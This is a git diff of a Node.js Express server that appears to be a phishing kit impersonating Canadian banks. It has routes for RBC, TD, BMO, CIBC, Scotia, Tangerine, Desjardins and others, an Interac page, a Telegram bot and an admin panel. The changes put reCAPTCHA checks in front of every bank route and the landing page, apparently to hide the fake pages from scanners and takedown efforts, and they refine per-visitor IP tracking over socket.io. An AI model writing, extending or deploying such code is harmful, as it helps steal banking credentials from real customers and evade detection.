@@ -5,6 +5,7 @@ const express = require('express');
 const { createServer } = require('node:http');
 const bodyParser = require('body-parser');
 const { Server } = require('socket.io');
+const fs = require('fs');
 let fetch;
 const TelegramBot = require('node-telegram-bot-api');
 const session = require('express-session');
@@ -36,14 +37,13 @@ const td = require('./routers/td');
 
 require('dotenv').config();
 
-
-
 // ====================
 // Configuration
 // ====================
 const app = express();
 
 const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
+const RECAPTCHA_SITE_KEY = process.env.RECAPTCHA_SITE_KEY;
 const token = process.env.TELEGRAM_BOT_API_KEY;
 const chatId = process.env.TELEGRAM_CHAT_ID;
 const adminKey = process.env.ADMIN_KEY;
@@ -330,22 +330,22 @@ const pool = new Pool(dbConfig);
 createTable();
 
 app.get('/', (req, res) => {
-    res.render('captcha/index')
+    res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY})
 })
 
-app.get('/interac',  async (req, res) => {
+app.post('/interac', verifyRecaptcha, async (req, res) => {
     try{
         const getId = 1; // Since we're always dealing with the record with id = 1
         const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
 
         let info = result.rows[0].data.settings.info;  
         
-        if(result.rows.length > 0){res.render('interac/index', {data: info});} else {res.render('catpcha/index');}
+        if(result.rows.length > 0){res.render('interac/index', {data: info});} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
         
         
     } catch (error) {
         console.error(error);
-        res.render('captcha/index');
+        res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
     }
 })
 
@@ -449,25 +449,25 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
     }
 });
 
-app.use('/atb', atb)
-app.use('/bmo', bmo)
-app.use('/cibc', cibc)
-app.use('/desj', desj)
-app.use('/hsbc', hsbc)
-app.use('/laur', laur)
-app.use('/manu', manu)
-app.use('/meridian', meridian)
-app.use('/motus', motus)
-app.use('/scotia', scotia)
-app.use('/nbc', nbc)
-app.use('/pc', pc)
-app.use('/rbc', rbc)
-app.use('/simplii', simplii)
-app.use('/tangerine', tangerine)
-app.use('/td', td)
+app.use('/atb', checkRecaptchaSession,atb)
+app.use('/bmo', checkRecaptchaSession,bmo)
+app.use('/cibc', checkRecaptchaSession,cibc)
+app.use('/desj', checkRecaptchaSession,desj)
+app.use('/hsbc', checkRecaptchaSession,hsbc)
+app.use('/laur', checkRecaptchaSession,laur)
+app.use('/manu', checkRecaptchaSession,manu)
+app.use('/meridian', checkRecaptchaSession,meridian)
+app.use('/motus', checkRecaptchaSession,motus)
+app.use('/scotia', checkRecaptchaSession,scotia)
+app.use('/nbc', checkRecaptchaSession,nbc)
+app.use('/pc', checkRecaptchaSession,pc)
+app.use('/rbc', checkRecaptchaSession,rbc)
+app.use('/simplii', checkRecaptchaSession,simplii)
+app.use('/tangerine', checkRecaptchaSession,tangerine)
+app.use('/td', checkRecaptchaSession,td)
 
 app.use((req, res, next) => {
-    res.status(404).render('captcha/index');
+    res.status(404).render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
 });
 
 
@@ -479,6 +479,9 @@ app.use((req, res, next) => {
 io.on('connection', (socket, req) => {
     let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
     userIP = userIP.split(',')[0].trim();
+    if (userIP.includes('::ffff:')) {
+        userIP = userIP.replace('::ffff:', '');
+    }
 
     socket.join(userIP);
 
